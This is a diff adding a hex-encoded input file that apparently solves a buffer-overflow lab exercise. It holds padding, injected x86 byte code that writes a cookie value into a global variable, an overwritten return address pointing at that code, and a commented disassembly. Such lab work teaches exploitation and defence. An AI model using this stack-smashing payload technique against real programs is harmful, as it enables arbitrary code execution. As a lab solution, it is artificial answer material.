@@ -1,0 +1,22 @@
+00 00 00 00
+00 00 00 00
+00 00 00 00   
+00 00 00 00
+00 00 00 00
+00 00 00 00
+68 22 90 04  /* start my byte code  */
+08 c7 05 ec
+c1 04 08 aa
+a6 94 20 c3  /* end of my byte code */
+00 00 00 00  
+00 39 68 55  /* the address of my byte code is 0x 55 68 39 00 */
+00 00 00 00
+aa a6 94 20  /* Cookie of qquan is 0x 20 94 a6 aa */
+
+ /* Global_val addr is 0x804c1ec  */
+ 
+ /*   0:	68 22 90 04 08       	push   $0x8049022               */
+ /*   5:	c7 05 ec c1 04 08 aa 	movl   $0x2094a6aa,0x804c1ec    */
+ /*   c:	a6 94 20                                                */
+ /*   f:	c3                   	ret                             */
+  
